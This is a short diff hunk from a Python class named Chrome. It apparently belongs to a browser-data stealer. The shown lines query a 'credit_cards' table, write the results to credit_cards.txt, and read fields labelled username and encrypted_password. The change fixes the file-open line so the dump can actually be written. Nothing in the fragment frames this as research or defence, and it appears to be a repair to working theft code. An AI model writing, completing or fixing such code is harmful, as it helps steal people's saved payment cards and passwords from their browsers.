@@ -113,7 +113,7 @@ class Chrome:
 
                 cursor.execute("SELECT * FROM credit_cards")
 
-                with open("credit_cards.txt", "w", encoding="utf-8"):
+                with open("credit_cards.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         username = item[1]
                         encrypted_password = item[4]
